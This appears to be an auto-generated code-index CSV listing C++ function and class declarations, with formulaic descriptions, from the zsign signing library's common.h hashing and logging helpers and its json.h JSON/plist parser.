742,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHASum - implements shasum functionality","bool SHASum(int nSumType, const string &strData, string &strOutput);"
743,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHASum - implements shasum functionality","bool SHASum(const string &strData, string &strSHA1, string &strSHA256);"
744,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHA1Text - implements sha1text functionality","bool SHA1Text(const string &strData, string &strOutput);"
745,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHASumFile - implements shasumfile functionality","bool SHASumFile(const char *szFile, string &strSHA1, string &strSHA256);"
746,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHASumBase64 - implements shasumbase64 functionality","bool SHASumBase64(const string &strData, string &strSHA1Base64, string &strSHA256Base64);"
747,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SHASumBase64File - implements shasumbase64file functionality","bool SHASumBase64File(const char *szFile, string &strSHA1Base64, string &strSHA256Base64);"
748,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintSHASum - implements printshasum functionality","void PrintSHASum(const char *prefix, const uint8_t *hash, uint32_t size, const char *suffix = ""\n"");"
749,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintSHASum - implements printshasum functionality","void PrintSHASum(const char *prefix, const string &strSHASum, const char *suffix = ""\n"");"
750,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintDataSHASum - implements printdatashasum functionality","void PrintDataSHASum(const char *prefix, int nSumType, const string &strData, const char *suffix = ""\n"");"
751,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintDataSHASum - implements printdatashasum functionality","void PrintDataSHASum(const char *prefix, int nSumType, uint8_t *data, size_t size, const char *suffix = ""\n"");"
752,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","class ZBuffer - implements functionality related to z buffer","class ZBuffer
{"
753,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Free - implements free functionality","void Free();"
754,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","class ZTimer - implements functionality related to z timer","class ZTimer
{"
755,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Reset - implements reset functionality","uint64_t Reset();"
756,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Print - implements print functionality","uint64_t Print(const char *szFormatArgs, ...);"
757,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintResult - implements printresult functionality","uint64_t PrintResult(bool bSuccess, const char *szFormatArgs, ...);"
758,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","class ZLog - implements functionality related to z log","class ZLog
{"
759,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function IsDebug - implements isdebug functionality","static bool IsDebug();"
760,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Print - implements print functionality","static void Print(const char *szLog);"
761,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintV - implements printv functionality","static void PrintV(const char *szFormatArgs, ...);"
762,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Debug - implements debug functionality","static void Debug(const char *szLog);"
763,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function DebugV - implements debugv functionality","static void DebugV(const char *szFormatArgs, ...);"
764,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Warn - implements warn functionality","static bool Warn(const char *szLog);"
765,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function WarnV - implements warnv functionality","static bool WarnV(const char *szFormatArgs, ...);"
766,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Error - implements error functionality","static bool Error(const char *szLog);"
767,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function ErrorV - implements errorv functionality","static bool ErrorV(const char *szFormatArgs, ...);"
768,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Success - implements success functionality","static bool Success(const char *szLog);"
769,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SuccessV - implements successv functionality","static bool SuccessV(const char *szFormatArgs, ...);"
770,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintResult - implements printresult functionality","static bool PrintResult(bool bSuccess, const char *szLog);"
771,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintResultV - implements printresultv functionality","static bool PrintResultV(bool bSuccess, const char *szFormatArgs, ...);"
772,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function Print - implements print functionality","static void Print(int nLevel, const char *szLog);"
773,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function PrintV - implements printv functionality","static void PrintV(int nLevel, const char *szFormatArgs, ...);"
774,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function SetLogLever - implements setloglever functionality","static void SetLogLever(int nLogLevel);"
775,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h","Function writeToLogFile - implements writetologfile functionality","static void writeToLogFile(const std::string &message);"
776,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","class JValue - implements functionality related to j value","class JValue
{"
777,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function create - creates ","* @param type The type of JValue to create (default is null)
*/
explicit JValue(TYPE type = E_NULL);"
778,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(TYPE type = E_NULL);"
779,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(int val);"
780,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(bool val);"
781,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(double val);"
782,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(int64_t val);"
783,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(const char *val);"
784,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(const string &val);"
785,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function JValue - implements jvalue functionality","explicit JValue(const char *val, size_t len);"
786,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asInt - implements asint functionality","int asInt() const;"
787,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asBool - implements asbool functionality","bool asBool() const;"
788,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asFloat - implements asfloat functionality","double asFloat() const;"
789,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asInt64 - implements asint64 functionality","int64_t asInt64() const;"
790,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asString - implements asstring functionality","string asString() const;"
791,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asDate - implements asdate functionality","time_t asDate() const;"
792,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function asData - implements asdata functionality","string asData() const;"
793,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function assignData - implements assigndata functionality","void assignData(const char *val, size_t size);"
794,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function assignDate - implements assigndate functionality","void assignDate(time_t val);"
795,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function assignDateString - implements assigndatestring functionality","void assignDateString(time_t val);"
796,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function type - implements type functionality","TYPE type() const;"
797,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function size - implements size functionality","size_t size() const;"
798,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function clear - implements clear functionality","void clear();"
799,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function has - checks if it has ","bool has(const char *key) const;"
800,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function index - implements index functionality","int index(const char *ele) const;"
801,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function keys - implements keys functionality","bool keys(vector<string> &arrKeys) const;"
802,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function join - implements join functionality","bool join(JValue &jv);"
803,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function append - implements append functionality","bool append(JValue &jv);"
804,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function remove - implements remove functionality","bool remove(int index);"
805,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function remove - implements remove functionality","bool remove(size_t index);"
806,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function remove - implements remove functionality","bool remove(const char *key);"
807,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(int val);"
808,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(bool val);"
809,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(double val);"
810,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(int64_t val);"
811,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(const char *val);"
812,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(const string &val);"
813,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(const JValue &jval);"
814,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function push_back - implements push back functionality","bool push_back(const char *val, size_t len);"
815,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isInt - checks if int","bool isInt() const;"
816,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isNull - checks if null","bool isNull() const;"
817,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isBool - checks if bool","bool isBool() const;"
818,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isFloat - checks if float","bool isFloat() const;"
819,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isArray - checks if array","bool isArray() const;"
820,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isObject - checks if object","bool isObject() const;"
821,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isString - checks if string","bool isString() const;"
822,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isEmpty - checks if empty","bool isEmpty() const;"
823,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isData - checks if data","bool isData() const;"
824,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isDate - checks if date","bool isDate() const;"
825,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isDataString - checks if datastring","bool isDataString() const;"
826,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isDateString - checks if datestring","bool isDateString() const;"
827,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function int - implements int functionality","operator int() const;"
828,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function bool - implements bool functionality","operator bool() const;"
829,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function double - implements double functionality","operator double() const;"
830,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function int64_t - implements int64 t functionality","operator int64_t() const;"
831,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function string - implements string functionality","operator string() const;"
832,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function Free - implements free functionality","void Free();"
833,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function CopyValue - implements copyvalue functionality","void CopyValue(const JValue &src);"
834,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function WriteDataToFile - implements writedatatofile functionality","bool WriteDataToFile(const char *file, const char *data, size_t len);"
835,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function write - implements write functionality","string write() const;"
836,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function styleWrite - implements stylewrite functionality","string styleWrite() const;"
837,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function read - implements read functionality","bool read(const char *pdoc, string *pstrerr = NULL);"
838,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function read - implements read functionality","bool read(const string &strdoc, string *pstrerr = NULL);"
839,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function writePList - implements writeplist functionality","string writePList() const;"
840,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readPList - implements readplist functionality","bool readPList(const string &strdoc, string *pstrerr = NULL);"
841,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readPList - implements readplist functionality","bool readPList(const char *pdoc, size_t len = 0, string *pstrerr = NULL);"
842,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readFile - implements readfile functionality","bool readFile(const char *file, string *pstrerr = NULL);"
843,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readPListFile - implements readplistfile functionality","bool readPListFile(const char *file, string *pstrerr = NULL);"
844,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function writeFile - implements writefile functionality","bool writeFile(const char *file);"
845,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function writePListFile - implements writeplistfile functionality","bool writePListFile(const char *file);"
846,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function styleWriteFile - implements stylewritefile functionality","bool styleWriteFile(const char *file);"
847,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readPath - implements readpath functionality","bool readPath(const char *path, ...);"
848,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readPListPath - implements readplistpath functionality","bool readPListPath(const char *path, ...);"
849,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function writePath - implements writepath functionality","bool writePath(const char *path, ...);"
850,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function writePListPath - implements writeplistpath functionality","bool writePListPath(const char *path, ...);"
851,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function styleWritePath - implements stylewritepath functionality","bool styleWritePath(const char *path, ...);"
852,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","class JReader - implements functionality related to j reader","class JReader
{"
853,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function parse - implements parse functionality","bool parse(const char *pdoc, JValue &root);"
854,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function error - implements error functionality","void error(string &strmsg) const;"
855,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","struct Token - implements functionality related to token","struct Token
{"
856,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function skipSpaces - implements skipspaces functionality","void skipSpaces();"
857,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function skipComment - implements skipcomment functionality","void skipComment();"
858,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function match - implements match functionality","bool match(const char *pattern, int patternLength);"
859,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readToken - implements readtoken functionality","bool readToken(Token &token);"
860,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readValue - implements readvalue functionality","bool readValue(JValue &jval);"
861,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readArray - implements readarray functionality","bool readArray(JValue &jval);"
862,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readNumber - implements readnumber functionality","void readNumber();"
863,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readString - implements readstring functionality","bool readString();"
864,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readObject - implements readobject functionality","bool readObject(JValue &jval);"
865,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function decodeNumber - implements decodenumber functionality","bool decodeNumber(Token &token, JValue &jval);"
866,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function decodeString - implements decodestring functionality","bool decodeString(Token &token, string &decoded);"
867,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function decodeDouble - implements decodedouble functionality","bool decodeDouble(Token &token, JValue &jval);"
868,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function GetNextChar - implements getnextchar functionality","char GetNextChar();"
869,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function addError - implements adderror functionality","bool addError(const string &message, const char *ploc);"
870,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","class JWriter - implements functionality related to j writer","class JWriter
{"
871,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function FastWrite - implements fastwrite functionality","static void FastWrite(const JValue &jval, string &strDoc);"
872,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function FastWriteValue - implements fastwritevalue functionality","static void FastWriteValue(const JValue &jval, string &strDoc);"
873,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function PushValue - implements pushvalue functionality","void PushValue(const string &strval);"
874,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function StyleWriteValue - implements stylewritevalue functionality","void StyleWriteValue(const JValue &jval);"
875,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function StyleWriteArrayValue - implements stylewritearrayvalue functionality","void StyleWriteArrayValue(const JValue &jval);"
876,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function isMultineArray - checks if multinearray","bool isMultineArray(const JValue &jval);"
877,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function v2s - implements v2s functionality","static string v2s(double val);"
878,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function v2s - implements v2s functionality","static string v2s(int64_t val);"
879,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function v2s - implements v2s functionality","static string v2s(const char *val);"
880,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function vstring2s - implements vstring2s functionality","static string vstring2s(const char *val);"
881,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function d2s - implements d2s functionality","static string d2s(time_t t);"
882,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","////////////////////////////////////////////////////////////////////////","class PReader
{"
883,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function parse - implements parse functionality","bool parse(const char *pdoc, size_t len, JValue &root);"
884,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function error - implements error functionality","void error(string &strmsg) const;"
885,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","struct Token - implements functionality related to token","struct Token
{"
886,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readToken - implements readtoken functionality","bool readToken(Token &token);"
887,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readLabel - implements readlabel functionality","bool readLabel(string &label);"
888,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readValue - implements readvalue functionality","bool readValue(JValue &jval, Token &token);"
889,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readArray - implements readarray functionality","bool readArray(JValue &jval);"
890,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readNumber - implements readnumber functionality","bool readNumber();"
891,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readString - implements readstring functionality","bool readString();"
892,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readDictionary - implements readdictionary functionality","bool readDictionary(JValue &jval);"
893,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function endLabel - implements endlabel functionality","void endLabel(Token &token, const char *szLabel);"
894,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function decodeNumber - implements decodenumber functionality","bool decodeNumber(Token &token, JValue &jval);"
895,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function decodeString - implements decodestring functionality","bool decodeString(Token &token, string &decoded, bool filter = true);"
896,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function decodeDouble - implements decodedouble functionality","bool decodeDouble(Token &token, JValue &jval);"
897,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function skipSpaces - implements skipspaces functionality","void skipSpaces();"
898,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function addError - implements adderror functionality","bool addError(const string &message, const char *ploc);"
899,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function parseBinary - implements parsebinary functionality","bool parseBinary(const char *pbdoc, size_t len, JValue &pv);"
900,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function getUInt24FromBE - retrieves uint24frombe","uint32_t getUInt24FromBE(const char *v);"
901,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function byteConvert - implements byteconvert functionality","void byteConvert(uint8_t *v, size_t size);"
902,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function getUIntVal - retrieves uintval","uint64_t getUIntVal(const char *v, size_t size);"
903,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readUIntSize - implements readuintsize functionality","bool readUIntSize(const char *&pcur, size_t &size);"
904,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readBinaryValue - implements readbinaryvalue functionality","bool readBinaryValue(const char *&pcur, JValue &pv);"
905,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function readUnicode - implements readunicode functionality","bool readUnicode(const char *pcur, size_t size, JValue &pv);"
